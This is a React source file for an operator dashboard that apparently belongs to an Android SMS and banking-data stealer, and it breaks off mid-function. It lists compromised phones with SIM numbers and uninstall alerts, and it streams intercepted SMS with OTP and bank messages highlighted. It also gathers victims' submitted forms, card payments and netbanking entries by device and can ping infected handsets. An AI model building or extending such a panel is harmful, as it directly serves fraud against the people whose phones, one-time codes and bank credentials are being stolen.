// src/pages/MainPage.tsx
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";

import TopNav, { type TabKey }          from "../components/layout/TopNav";
import wsService                         from "../services/ws/wsService";
import { getDevices }                    from "../services/api/devices";
import { listFormSubmissions }           from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { listNotificationsGrouped }      from "../services/api/sms";
import { ENV, apiHeaders }               from "../config/constants";
import { pickLastSeenAt }                from "../utils/reachability";
import { logout }                        from "../services/api/auth";

// ─── Types ────────────────────────────────────────────────────────────────────
type AnyRecord      = Record<string, any>;
type SortMode       = "new" | "old";
type DeviceSortMode = "latest" | "old2new";
type CheckStatus    = "checking" | "online" | "uninstalled";

// ─── Helpers ──────────────────────────────────────────────────────────────────
function str(v: any): string { return String(v ?? "").trim(); }

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} seconds ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.createdAt ?? m?.date ?? m?.updatedAt;
  if (typeof t === "number" && t > 0) return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!isNaN(n) && n > 0) return n;
    const d = Date.parse(t);
    if (!isNaN(d) && d > 0) return d;
  }
  return 0;
}

// Sort newest first — items with no timestamp go to bottom
// ─── Live TimeAgo (updates every second) ─────────────────────────────────────
function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
  const [text, setText] = useState(() => timeAgo(ts));
  useEffect(() => {
    const update = () => setText(timeAgo(ts));
    update();
    const t = setInterval(update, 1000);
    return () => clearInterval(t);
  }, [ts]);
  return <span className={className}>{text}</span>;
}

function sortByTime(a: AnyRecord, b: AnyRecord, mode: SortMode = "new"): number {
  const ta = getTs(a), tb = getTs(b);
  if (ta === 0 && tb === 0) return 0;
  if (ta === 0) return 1;
  if (tb === 0) return -1;
  return mode === "new" ? tb - ta : ta - tb;
}

function getId(m: any): string { return str(m?._id || m?.id || ""); }
function getDeviceId(m: any): string {
  return str(m?.uniqueid || m?.deviceId || m?.device_id || m?._deviceId || "");
}

const FINANCE_KW = ["credit","debit","bank","balance","transaction","txn","upi","amount",
  "a/c","inr","₹","paid","withdrawn","deposited","debited","credited","received","payment",
  "otp","one time","verification","ac no","acct"];
function isFinance(text: string): boolean {
  const l = text.toLowerCase();
  return FINANCE_KW.some((kw) => l.includes(kw));
}

const SKIP_KEYS = new Set(["_id","id","uniqueid","deviceId","device_id","__v",
  "createdAt","updatedAt","timestamp","_type","_ts","_deviceId","_dtype"]);

function getPayloadEntries(obj: AnyRecord): [string, string][] {
  const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
  return Object.entries(src)
    .filter(([k]) => !SKIP_KEYS.has(k) && !k.startsWith("_"))
    .map(([k, v]) => [k, str(v)])
    .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
}

function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }

// ─── Dark-mode aware style helpers ───────────────────────────────────────────
const D = {
  page:        (d: boolean) => d ? "bg-gray-900 text-gray-100" : "bg-gray-50 text-gray-900",
  card:        (d: boolean) => d ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200",
  label:       (d: boolean) => d ? "text-blue-400"    : "text-blue-600",
  value:       (d: boolean) => d ? "text-gray-100"    : "text-gray-800",
  idGreen:     (d: boolean) => d ? "text-green-400"   : "text-green-600",
  meta:        (d: boolean) => d ? "text-gray-400"    : "text-gray-500",
  divider:     (d: boolean) => d ? "border-gray-600"  : "border-gray-100",
  dividerMed:  (d: boolean) => d ? "border-gray-600"  : "border-gray-300",
  searchBg:    (d: boolean) => d ? "bg-gray-700 border-gray-600 text-white placeholder-gray-400" : "bg-white border-gray-300 text-gray-900 placeholder-gray-400",
  selectBg:    (d: boolean) => d ? "bg-gray-700 border-gray-600 text-gray-100" : "bg-white border-gray-300 text-gray-800",
  btnOutline:  (d: boolean) => d ? "bg-gray-700 border-gray-500 text-gray-100 hover:bg-gray-600" : "bg-white border-gray-300 text-gray-800 hover:bg-gray-50",
  empty:       (d: boolean) => d ? "text-gray-500" : "text-gray-400",
  deviceCard:  (d: boolean) => d ? "bg-gray-800 border-gray-600" : "bg-white border-gray-200",
  deviceText:  (d: boolean) => d ? "text-gray-100" : "text-gray-900",
  deviceMeta:  (d: boolean) => d ? "text-gray-400" : "text-gray-500",
};

// ─── CopyBtn ──────────────────────────────────────────────────────────────────
function CopyBtn({ value }: { value: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button type="button" onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
      className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
      {ok ? "✅" : "📋"}
    </button>
  );
}

// ─── Form Card ────────────────────────────────────────────────────────────────
function FormCard({ form, onDeviceClick, dark }: { form: AnyRecord; onDeviceClick?: (id: string) => void; dark: boolean }) {
  const ts      = getTs(form);
  const did     = getDeviceId(form);
  const entries = getPayloadEntries(form);
  if (entries.length === 0) return null;
  return (
    <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
      {entries.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center">
            <span className={`text-[13px] font-semibold ${D.label(dark)}`}>{k}:</span>
            <CopyBtn value={v} />
          </div>
          <div className={`text-[13px] ${D.value(dark)}`}>{v}</div>
        </div>
      ))}
      <hr className={`my-2 border-t ${D.divider(dark)}`} />
      <div className="flex items-center justify-between">
        {did ? (
          <button type="button" onClick={() => onDeviceClick?.(did)}
            className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
            ID: {did.slice(0, 16)}
          </button>
        ) : <span />}
        <span className={`text-[11px] ${D.meta(dark)}`}>{ts ? new Date(ts).toLocaleString() : "-"}</span>
      </div>
    </div>
  );
}

// ─── SMS Card ─────────────────────────────────────────────────────────────────
function SmsCard({ sms, pageNum, onDeviceClick, dark }: {
  sms: AnyRecord; pageNum?: number; onDeviceClick?: (id: string) => void; dark: boolean;
}) {
  const ts      = getTs(sms);
  const did     = getDeviceId(sms);
  const msg     = str(sms.body || sms.message || sms.msg || "");
  const sender  = str(sms.sender || sms.senderNumber || sms.from || "");
  const mob1    = str(sms.receiver || sms.adminPhone || sms.mob || "");
  const mob2    = str(sms.receiver2 || sms.mob2 || "");
  const dateStr = ts ? new Date(ts).toString() : "-";
  const fin     = isFinance(msg);

  function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
    return (
      <div className="mb-2">
        <div className="flex items-center">
          <span className={`text-[13px] font-semibold ${D.label(dark)}`}>{label}:</span>
          <CopyBtn value={value} />
        </div>
        <div className={`text-[13px] ${red ? (dark ? "text-red-400" : "text-red-600") : D.value(dark)}`}>{value}</div>
      </div>
    );
  }

  return (
    <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
      <Row label="Date"   value={dateStr} />
      {msg    && <Row label="MSG"    value={msg}    red={fin} />}
      {sender && <Row label="SENDER" value={sender} />}
      {mob1   && <Row label="MOB"    value={mob1}   />}
      {mob2   && <Row label="MOB 2"  value={mob2}   />}
      <hr className={`my-2 border-t ${D.divider(dark)}`} />
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          {did ? (
            <button type="button" onClick={() => onDeviceClick?.(did)}
              className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
              ID: {did.slice(0, 14)}
            </button>
          ) : <span />}
          {pageNum != null && (
            <span className={`rounded px-1.5 py-0.5 text-[11px] font-semibold ${dark ? "bg-gray-700 text-gray-300" : "bg-gray-100 text-gray-500"}`}>
              Page {pageNum}
            </span>
          )}
        </div>
        <span className={`text-[11px] ${D.meta(dark)}`}>{timeAgo(ts)}</span>
      </div>
    </div>
  );
}

// ─── Group Card ───────────────────────────────────────────────────────────────
function GroupCard({ deviceId, items, onDeviceClick, dark }: {
  deviceId: string; items: AnyRecord[]; onDeviceClick?: (id: string) => void; dark: boolean;
}) {
  const latestTs = Math.max(...items.map(getTs).filter(Boolean));
  return (
    <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
      {items.map((item, idx) => {
        const entries = getPayloadEntries(item);
        if (entries.length === 0) return null;
        return (
          <div key={getId(item) || idx}>
            {entries.map(([k, v]) => (
              <div key={k} className="mb-2">
                <div className="flex items-center">
                  <span className={`text-[13px] font-semibold ${D.label(dark)}`}>{k}:</span>
                  <CopyBtn value={v} />
                </div>
                <div className={`text-[13px] ${D.value(dark)}`}>{v}</div>
              </div>
            ))}
            {idx < items.length - 1 && <hr className={`my-2 border-t ${D.dividerMed(dark)}`} />}
          </div>
        );
      })}
      <hr className={`my-2 border-t ${D.divider(dark)}`} />
      <div className="flex items-center justify-between">
        <button type="button" onClick={() => onDeviceClick?.(deviceId)}
          className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
          ID: {deviceId.slice(0, 16)}
        </button>
        <span className={`text-[11px] ${D.meta(dark)}`}>{latestTs ? new Date(latestTs).toLocaleString() : "-"}</span>
      </div>
    </div>
  );
}

// ─── Device Card ──────────────────────────────────────────────────────────────
function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark }: {
  device: AnyRecord; displayNum: number;
  onCheckOnline: (id: string) => void;
  onOpen: (id: string) => void;
  recentlyOnline: boolean; dark: boolean;
}) {
  const did     = str(device.deviceId || device.uniqueid || "");
  const brand   = str(device.metadata?.brand || device.metadata?.manufacturer || "Unknown");
  const model   = str(device.metadata?.model || "");
  const android = str(device.metadata?.androidVersion || "");
  const sim     = device.simInfo;
  // Sirf checkedAt — automatic lastSeen nahi dikhna
  const checkedAt = Number((device as any).checkedAt || 0);

  // Live tick — isRecent recomputes every second so color updates without refresh
  const [, setTick] = useState(0);
  useEffect(() => {
    const t = setInterval(() => setTick(n => n + 1), 1000);
    return () => clearInterval(t);
  }, []);

  const isRecent = recentlyOnline || (checkedAt > 0 && (Date.now() - checkedAt) < 50 * 1000);

  const rows: { text: React.ReactNode }[] = [
    {
      text: (
        <div className="text-center text-[12px]">
          <span className={D.deviceMeta(dark)}>ID: </span>
          <span className={`font-bold ${D.idGreen(dark)}`}>{did.slice(0, 16)}</span>
        </div>
      ),
    },
    ...(android ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>Android: {android}</div> }] : []),
    ...(sim?.sim1Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 1: {sim.sim1Carrier ? `${sim.sim1Carrier} — ` : ""}{sim.sim1Number}</div> }] : []),
    ...(sim?.sim2Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 2: {sim.sim2Carrier ? `${sim.sim2Carrier}: ` : ""}{sim.sim2Number}</div> }] : []),
    {
      text: (
        <div className="text-center text-[12px]">
          <span className={D.deviceMeta(dark)}>Online: </span>
          {checkedAt > 0
            ? <TimeAgo ts={checkedAt} className={`font-semibold ${isRecent ? "text-green-500" : "text-red-500"}`} />
            : <span className="font-semibold text-gray-400">Never checked</span>
          }
        </div>
      ),
    },
  ];

  return (
    <div className={`cursor-pointer rounded-xl border p-3 shadow-sm transition-shadow hover:shadow-md ${D.deviceCard(dark)}`}
      onClick={() => onOpen(did)}>
      {/* Header: number + name */}
      <div className={`mb-2 text-center text-[13px] font-bold ${D.deviceText(dark)}`}>
        {displayNum}. {brand}{model ? ` (${model})` : ""}
      </div>

      {/* Inner bordered rows — same as competitor image */}
      <div className={`overflow-hidden rounded-lg border ${dark ? "border-gray-600" : "border-gray-200"}`}>
        {rows.map((row, i) => (
          <div key={i} className={[
            "px-3 py-2",
            i < rows.length - 1 ? (dark ? "border-b border-gray-600" : "border-b border-gray-200") : "",
          ].join(" ")}>
            {row.text}
          </div>
        ))}
      </div>

      {/* Check Online button */}
      <button type="button"
        onClick={(e) => { e.stopPropagation(); onCheckOnline(did); }}
        className={`mt-3 w-full rounded-lg border py-2 text-[13px] font-semibold active:scale-[0.98] ${D.btnOutline(dark)}`}>
        Check Online
      </button>
    </div>
  );
}

// ─── Check Online Alert ───────────────────────────────────────────────────────
function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
      <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl" onClick={(e) => e.stopPropagation()}>
        <button type="button" onClick={onClose}
          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">✕</button>
        <div className="mb-4 text-[15px] font-extrabold text-red-500">Alert</div>
        {status === "checking" && (
          <div className="text-center text-[14px] leading-6 text-gray-800">
            We've forwarded your request to the phone.
            Wait up to 30 seconds for confirmation; if no reply appears,
            the device is currently offline.
          </div>
        )}
        {status === "online" && (
          <div className="text-center text-[15px] font-semibold text-green-600">Device is Online ✅</div>
        )}
        {status === "uninstalled" && (
          <div className="text-center text-[15px] font-semibold text-red-600">App Uninstalled! ⚠️</div>
        )}
      </div>
    </div>
  );
}

// ─── Search Bar ───────────────────────────────────────────────────────────────
function SearchBar({ value, onChange, filter, onFilter, options, dark }: {
  value: string; onChange: (v: string) => void;
  filter: string; onFilter: (v: string) => void;
  options: { value: string; label: string }[]; dark: boolean;
}) {
  return (
    <div className="flex items-center gap-2 px-3 py-2">
      <div className="relative flex-1">
        <input value={value} onChange={(e) => onChange(e.target.value)}
          placeholder="Search data and press enter/search icon"
          className={`h-10 w-full rounded-full border pl-4 pr-10 text-[13px] outline-none ${D.searchBg(dark)}`} />
        <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">🔍</span>
      </div>
      <select value={filter} onChange={(e) => onFilter(e.target.value)}
        className={`h-10 rounded-full border px-3 text-[13px] font-semibold outline-none ${D.selectBg(dark)}`}>
        {options.map((o) => <option key={o.value} value={o.value}>{o.label}</option>)}
      </select>
    </div>
  );
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────────────
const SMS_PER_PAGE = 20;

export default function MainPage() {
  const nav      = useNavigate();
  const location  = useLocation();

  // default: day mode
  // ── Help / Settings / APK Info overlay ──────────────────────────────────────
  const [helpOpen,    setHelpOpen]    = useState(false);
  const [helpScreen,  setHelpScreen]  = useState<"" | "settings" | "apk">("");

  // Settings state
  const [globalPhone,    setGlobalPhone]    = useState("");
  const [globalEnabled,  setGlobalEnabled]  = useState(false);
  const [globalLoading,  setGlobalLoading]  = useState(false);
  const [globalMsg,      setGlobalMsg]      = useState("");
  const [pinOld,         setPinOld]         = useState("");
  const [pinNew,         setPinNew]         = useState("");
  const [pinConfirm,     setPinConfirm]     = useState("");
  const [pinMsg,         setPinMsg]         = useState("");

  // APK Info state
  const [licenseInfo,  setLicenseInfo]  = useState<any>(null);
  const [contactOpen,  setContactOpen]  = useState(false);

  const [activeTab, setActiveTab] = useState<TabKey>(() => {
    return ((location.state as any)?.tab as TabKey) || "home";
  });

  // Auto-open Settings if redirected from LoginPage (default PIN warning)
  useEffect(() => {
    if ((location.state as any)?.openSettings) {
      setHelpScreen("settings");
      loadGlobalPhone();
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  const [dark,       setDark]       = useState(false);
  const [search,     setSearch]     = useState("");
  const [sortMode,   setSortMode]   = useState<SortMode>("new");
  const [deviceSort, setDeviceSort] = useState<DeviceSortMode>("latest");
  const [alertText,  setAlertText]  = useState("");

  const [devices,  setDevices]  = useState<AnyRecord[]>([]);
  const [forms,    setForms]    = useState<AnyRecord[]>([]);
  const [smsMap,   setSmsMap]   = useState<Record<string, AnyRecord[]>>({});
  const [cardMap,  setCardMap]  = useState<Record<string, AnyRecord[]>>({});
  const [netMap,   setNetMap]   = useState<Record<string, AnyRecord[]>>({});

  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingForms,   setLoadingForms]   = useState(false);
  const [loadingSms,     setLoadingSms]     = useState(false);
  const [loadingGroups,  setLoadingGroups]  = useState(false);
  const groupsLoadedRef = useRef(false);

  const [checkAlert,         setCheckAlert]         = useState<{ deviceId: string; status: CheckStatus } | null>(null);
  const [recentlyOnlineMap,  setRecentlyOnlineMap]  = useState<Record<string, number>>({});
  const checkDeviceIdRef  = useRef("");
  const checkStatusRef    = useRef<CheckStatus | null>(null);
  const checkTimerRef     = useRef<ReturnType<typeof setTimeout> | null>(null);
  const checkWindowRef    = useRef<number>(0);
  const deviceOrderRef     = useRef<string[]>([]); // stable order — only updates on loadDevices

  // ── Loaders ──────────────────────────────────────────────────────────────
  const loadDevices = useCallback(async () => {
    setLoadingDevices(true);
    try {
      const l = await getDevices();
      const list = Array.isArray(l) ? l : [];
      setDevices(list);
      // createdAt se sort — ye kabhi nahi badlega (device register time)
      const sorted = [...list].sort((a, b) => {
        const ta = Number(a?.createdAt ? new Date(a.createdAt).getTime() : 0);
        const tb = Number(b?.createdAt ? new Date(b.createdAt).getTime() : 0);
        return tb - ta; // newest registered = top
      });
      deviceOrderRef.current = sorted.map((d) => str(d.deviceId)).filter(Boolean);
    }
    catch (e) { console.error(e); } finally { setLoadingDevices(false); }
  }, []);

  const loadSms = useCallback(async () => {
    setLoadingSms(true);
    try { const g = await listNotificationsGrouped(); setSmsMap(typeof g === "object" && g ? g : {}); }
    catch (e) { console.error(e); } finally { setLoadingSms(false); }
  }, []);

  const loadGroupData = useCallback(async (formsList: AnyRecord[]) => {
    const ids = [...new Set(formsList.map(getDeviceId).filter(Boolean))].slice(0, 30);
    if (!ids.length) return;
    setLoadingGroups(true);
    try {
      const [cards, nets] = await Promise.all([
        Promise.allSettled(ids.map((id) => getCardPaymentsByDevice(id).then((d) => ({ id, data: d })))),
        Promise.allSettled(ids.map((id) => getNetbankingByDevice(id).then((d) => ({ id, data: d })))),
      ]);
      const cm: Record<string, AnyRecord[]> = {}, nm: Record<string, AnyRecord[]> = {};
      for (const r of cards) { if (r.status === "fulfilled" && r.value.data?.length) cm[r.value.id] = r.value.data; }
      for (const r of nets)  { if (r.status === "fulfilled" && r.value.data?.length) nm[r.value.id] = r.value.data; }
      setCardMap(cm); setNetMap(nm);
      groupsLoadedRef.current = true;
    } catch (e) { console.error(e); } finally { setLoadingGroups(false); }
  }, []);

  const loadAll = useCallback(async () => {
    groupsLoadedRef.current = false;
    loadDevices();
    loadSms();
    setLoadingForms(true);
    try {
      const fl = await listFormSubmissions();
      const list = Array.isArray(fl) ? fl : [];
      setForms(list);
      if (list.length > 0) loadGroupData(list);
    } catch (e) { console.error(e); } finally { setLoadingForms(false); }

    // Fetch alert ticker
    try {
      const r = await fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() });
      if (r.ok) { const d = await r.json(); if (d?.text) setAlertText(String(d.text)); }
    } catch {}
  }, [loadDevices, loadSms, loadGroupData]);

  // ── WS ────────────────────────────────────────────────────────────────────
  useEffect(() => {
    wsService.connect();
    loadAll();

    const off = wsService.onMessage((msg) => {
      if (!msg || msg.type !== "event") return;
      const event    = String(msg.event || "");
      const deviceId = String(msg.deviceId || msg?.data?.deviceId || "");

      if (event === "notification") {
        const data = msg.data || {};
        const did  = String(data.deviceId || deviceId || "");
        if (!did) return;
        const ns: AnyRecord = { ...data, _id: data._id || data.id || `${Date.now()}`, _deviceId: did, deviceId: did, timestamp: Number(data.timestamp || Date.now()) };
        setSmsMap((p) => ({ ...p, [did]: [ns, ...(p[did] || [])].sort((a, b) => getTs(b) - getTs(a)) }));
        return;
      }

      if (event === "form:created" || event === "form_submissions:created") {
        const data = msg.data || {};
        const did  = String(data.uniqueid || data.deviceId || deviceId || "");
        const pl   = data.payload && typeof data.payload === "object" ? data.payload : data;
        setForms((p) => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload: pl, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...p]);
        groupsLoadedRef.current = false;
        return;
      }

      if (event === "card:created" || event === "card_payment:created") {
        const data = msg.data || {};
        const did  = String(data.uniqueid || data.deviceId || deviceId || "");
        if (!did) return;
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setCardMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] }));
        return;
      }

      if (event === "netbanking:created" || event === "net_banking:created") {
        const data = msg.data || {};
        const did  = String(data.uniqueid || data.deviceId || deviceId || "");
        if (!did) return;
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setNetMap((p) => ({ ...p, [did]: [pl, ...(p[did] || [])] }));
        return;
      }

      if (event === "device:lastSeen" || event === "device:upsert") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        // lastSeen display UPDATE NAHI — sirf naya device add karo ya doosri info update karo
        setDevices((p) => {
          const exists = p.some((d) => str(d.deviceId) === did);
          if (exists) {
            // lastSeen.at update mat karo — baaki data update karo
            return p.map((d) => str(d.deviceId) === did
              ? { ...d, ...(msg.data || {}), lastSeen: d.lastSeen, checkedAt: d.checkedAt }
              : d
            );
          }
          // Naya device — add karo
          if (event === "device:upsert" && msg.data && did) {
            return [msg.data, ...p];
          }
          return p;
        });
        return;
      }

      // check_online:result — SIRF YE lastSeen display update karega
      if (event === "check_online:result") {
        const did    = String(msg.deviceId || msg?.data?.deviceId || "");
        const ts     = Number(msg?.data?.checkedAt || Date.now());
        const status = String(msg?.data?.status || "");
        const err    = String(msg?.data?.error  || "");
        const inW    = checkDeviceIdRef.current === did && checkStatusRef.current === "checking";

        if (status === "online" && did) {
          // checkedAt update
          setDevices((p) => p.map((d) => str(d.deviceId) === did ? { ...d, checkedAt: ts } : d));
          setRecentlyOnlineMap((p) => ({ ...p, [did]: ts }));
          setTimeout(() => setRecentlyOnlineMap((p) => { const c = { ...p }; delete c[did]; return c; }), 5000);
          // Alert resolve
          if (inW) {
            if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
            checkStatusRef.current = "online";
            setCheckAlert({ deviceId: did, status: "online" });
          }
        } else if (err && err !== "missing_token" && inW) {
          if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
          checkStatusRef.current = null;
          setCheckAlert({ deviceId: did, status: "checking" }); // keep checking state, error shown in DeviceDetail
        }
        return;
      }

      if (event === "device:uninstalled") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        const inW = checkDeviceIdRef.current === did &&
          (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000));
        if (inW) {
          if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
          checkStatusRef.current = "uninstalled";
          setCheckAlert({ deviceId: did, status: "uninstalled" });
        }
        return;
      }

      if (event === "device:delete") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        setDevices((p) => p.filter((d) => str(d.deviceId) !== did));
        setSmsMap((p) => { const c = { ...p }; delete c[did]; return c; });
      }
    });

    return () => { off(); };
  }, [loadAll]);

  useEffect(() => {
    if (activeTab === "groups" && !groupsLoadedRef.current && forms.length > 0) loadGroupData(forms);
  }, [activeTab, forms, loadGroupData]);

  // ── Check Online ─────────────────────────────────────────────────────────
  const handleCheckOnline = useCallback(async (deviceId: string) => {
    if (!deviceId) return;
    checkDeviceIdRef.current = deviceId;
    checkStatusRef.current   = "checking";
    checkWindowRef.current   = Date.now();
    setCheckAlert({ deviceId, status: "checking" });
    // 30 sec timeout — agar APK respond na kare
    if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
    checkTimerRef.current = setTimeout(() => {
      if (checkDeviceIdRef.current === deviceId && checkStatusRef.current === "checking") {
        checkStatusRef.current = null;
        setCheckAlert({ deviceId, status: "checking" }); // stays checking = unreachable
      }
    }, 30000);
    try {
      await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/ping`,
        { source: "main" }, { headers: apiHeaders(), timeout: 10000 });
    } catch {}
  }, []);

  const openDevice = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);

  const closeCheckAlert = useCallback(() => {
    // Timer clear karo but checkStatusRef null MAT karo
    // WS response abhi bhi aa sakta hai — tab re-alert show hoga
    if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
    setCheckAlert(null);
  }, []);

  // ── Computed ──────────────────────────────────────────────────────────────
  const { allSms, smsPageMap } = useMemo(() => {
    const list: AnyRecord[] = [];
    const pageMap: Record<string, number> = {};
    for (const [did, msgs] of Object.entries(smsMap)) {
      const sorted = [...(msgs || [])].sort((a, b) => getTs(b) - getTs(a));
      sorted.forEach((m, i) => {
        const page = Math.floor(i / SMS_PER_PAGE) + 1;
        const mid  = getId(m) || `${did}-${i}`;
        pageMap[mid] = page;
        list.push({ ...m, _deviceId: did, deviceId: did });
      });
    }
    return { allSms: list.sort((a, b) => getTs(b) - getTs(a)), smsPageMap: pageMap };
  }, [smsMap]);

  // Home: forms + SMS combined, ALWAYS newest first
  const mixedFeed = useMemo(() => {
    return [
      ...forms.map((f) => ({ ...f, _type: "form" as const, _ts: getTs(f) })),
      ...allSms.map((s) => ({ ...s, _type: "sms"  as const, _ts: getTs(s) })),
    ].sort((a, b) => sortByTime(a, b, sortMode));
  }, [forms, allSms, sortMode]);

  // Data: forms + cards + net combined, ALWAYS newest first
  const allDataItems = useMemo(() => {
    const allCards = Object.values(cardMap).flat().map((c) => ({ ...c, _dtype: "card" }));
    const allNets  = Object.values(netMap).flat().map((n) => ({ ...n, _dtype: "net"  }));
    return [
      ...forms.map((f) => ({ ...f, _dtype: "form" })),
      ...allCards,
      ...allNets,
    ].sort((a, b) => sortByTime(a, b, sortMode));
  }, [forms, cardMap, netMap, sortMode]);

  // Groups
  const groups = useMemo(() => {
    const map: Record<string, AnyRecord[]> = {};
    for (const f of forms) {
      const did = getDeviceId(f);
      if (!did) continue;
      if (!map[did]) map[did] = [];
      map[did].push(f);
    }
    for (const [did, cards] of Object.entries(cardMap)) {
      if (!map[did]) map[did] = [];
      map[did].push(...(cards || []));
    }
    for (const [did, nets] of Object.entries(netMap)) {
      if (!map[did]) map[did] = [];
      map[did].push(...(nets || []));
    }
    return Object.entries(map).map(([did, items]) => ({
      deviceId: did,
      items: items.sort((a, b) => getTs(b) - getTs(a)),
      latestTs: Math.max(...items.map(getTs).filter(Boolean)),
    })).sort((a, b) => sortByTime(a, b, sortMode));
  }, [forms, cardMap, netMap, sortMode]);

  // Devices
  const sortedDevices = useMemo(() => {
    const order = deviceOrderRef.current;
    if (!order.length) {
      // First load not done yet — fallback sort
      const getCheckedAt = (d: any) => Number(d?.checkedAt || 0);
      return [...devices].sort((a, b) =>
        deviceSort === "latest" ? getCheckedAt(b) - getCheckedAt(a) : getCheckedAt(a) - getCheckedAt(b)
      );
    }
    // Stable order: render in original position, new devices go to end
    const devMap = new Map(devices.map((d) => [str(d.deviceId), d]));
    const ordered: AnyRecord[] = [];
    for (const id of (deviceSort === "latest" ? order : [...order].reverse())) {
      const d = devMap.get(id);
      if (d) ordered.push(d);
    }
    // New devices not in order yet — append at end
    for (const d of devices) {
      if (!order.includes(str(d.deviceId))) ordered.push(d);
    }
    return ordered;
  }, [devices, deviceSort]);

  const q = search.trim().toLowerCase();
  function filterQ<T extends AnyRecord>(list: T[]): T[] {
    if (!q) return list;
    return list.filter((item) => JSON.stringify(item).toLowerCase().includes(q));
  }

  // ── Help helpers ──────────────────────────────────────────────────────────
  function handleLogout() { setHelpOpen(false); logout(); }

  function _openLink(url: string) {
    const a = document.createElement("a");
    a.href = url; a.target = "_blank"; a.rel = "noopener noreferrer";
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
  }

  function openWhatsApp() {
    const link = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim();
    if (!link) return;
    let url = "";
    try {
      const u = new URL(/^https?:\/\//i.test(link) ? link : `https://${link}`);
      const h = u.hostname.toLowerCase();
      if (h.includes("wa.me")) url = `https://wa.me/${u.pathname.replace(/\D/g,"")}`;
      else if (h.includes("whatsapp.com")) url = `https://api.whatsapp.com/send?phone=${(u.searchParams.get("phone")||u.pathname).replace(/\D/g,"")}`;
    } catch { url = `https://wa.me/${link.replace(/\D/g,"")}`; }
    if (url) _openLink(url);
  }

  function openHarmfullContact() {
    const link = String(import.meta.env.VITE_HARMFULL_FIX_WP_LINK || "").trim();
    if (!link) return;
    const msg = encodeURIComponent(`Hello Sir Please Remove My Harmfull Problem My Panel Id is ${String(ENV.PANEL_ID||"").trim()}`);
    let url = "";
    try {
      const u = new URL(/^https?:\/\//i.test(link) ? link : `https://${link}`);
      const h = u.hostname.toLowerCase();
      if (h.includes("wa.me")) url = `https://wa.me/${u.pathname.replace(/\D/g,"")}?text=${msg}`;
      else if (h.includes("whatsapp.com")) url = `https://api.whatsapp.com/send?phone=${(u.searchParams.get("phone")||u.pathname).replace(/\D/g,"")}&text=${msg}`;
    } catch {}
    if (url) _openLink(url);
  }

  function openTelegramTarget() {
    const raw = String((import.meta.env.VITE_TELEGRAM_TARGET as string) || "").trim();
    if (!raw) return;
    _openLink(raw.startsWith("http") ? raw : `https://${raw}`);
  }

  function openTelegramHelp() {
    _openLink(String(ENV.TELEGRAM_CHANNEL || "https://t.me/"));
  }

  async function loadGlobalPhone() {
    try {
      const r = await fetch(`${ENV.API_BASE}/api/admin/globalPhone`, { headers: apiHeaders() });
      const d = await r.json();
      const ph = String(d?.phone || "");
      setGlobalPhone(ph);
